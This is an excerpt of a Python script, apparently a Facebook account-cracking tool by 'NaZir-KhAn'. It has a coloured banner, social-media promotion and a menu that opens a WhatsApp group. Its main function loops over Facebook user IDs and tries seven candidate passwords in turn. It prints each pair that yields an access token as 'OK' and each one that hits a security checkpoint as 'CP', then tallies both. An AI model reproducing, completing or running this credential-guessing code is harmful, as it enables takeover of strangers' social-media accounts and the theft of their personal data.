...
\033[1;96m===    ======   ======  ===  ===                            
-----------------------------------------------
\033[1;93m AUTHOR: NaZir-KhAn
\033[1;93mFacebook:NaZir Khan
\033[1;93mFb Page:Gustah
\033[1;93mYOUTUBE: Daily Saraiki
\033[1;91m-----------------------------------------------
\033[1;94m Group : Gustah
\033[1;94m TEAM : Bussiness Team
\033[1;91m-----------------------------------------------
\033[1;91m-----------------------------------------------                           
                 USE FAST 4G SPEED INTERNET
\033[1;91m-----------------------------------------------
...
def main():
    ...
    print("\033[1;95m[2]\033[1;97mFOLLOW Sahu Zada ")
 
    print("")
 
    print("\033[1;91m[0]\033[1;97mEXIT Sahu Zada")
...
def main_select():
    ...
    if Mz =="2":
        ...
        os.system("xdg-open https://chat.whatsapp.com/BdDucDN1t4d93H76tD3CfD")
...
def menu():
    ...
    print("\033[1;97m[0]\033[1;97mEXIT Sahu Majid Jani")
...
def menu_select():
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        ...
		        print("\033[1;93m[AjmaLo>CP] "+uid+" = "+pass1)
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;97m[Nazir=OK] "+uid+" = "+pass1+"\x1b[1;0m")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                print("\033[1;93m[AjmaLo>CP] "+uid+" = "+pass2)
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;97m[Nazir=OK] "+uid+" = "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        print("\033[1;93m[AjmaLo>CP] "+uid+" = "+pass3)
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print("\x1b[1;97m[Nazir=OK] "+uid+" = "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                print("\033[1;93m[AjmaLo>CP] "+uid+" = "+pass4)
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;97m[Nazir=OK] "+uid+" = "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        print("\033[1;93m[AjmaLo>CP] "+uid+" = "+pass5)
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;97m[Nazir=OK] "+uid+" = "+pass5+"\x1b[1;0m")
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                print("\033[1;93m[AjmaLo>CP] "+uid+" = "+pass6)
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    print("\x1b[1;97m[Nazir=OK] "+uid+" = "+pass6+"\x1b[1;0m")
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        print("\033[1;93m[AjmaLo>CP] "+uid+" = "+pass7)
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            ...
		                                                            print("\x1b[1;97m[Nazir=OK] "+uid+" = "+pass7+"\x1b[1;0m")
	...
	print ("[!] Laye O Yar Hawaly Rab Dye Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
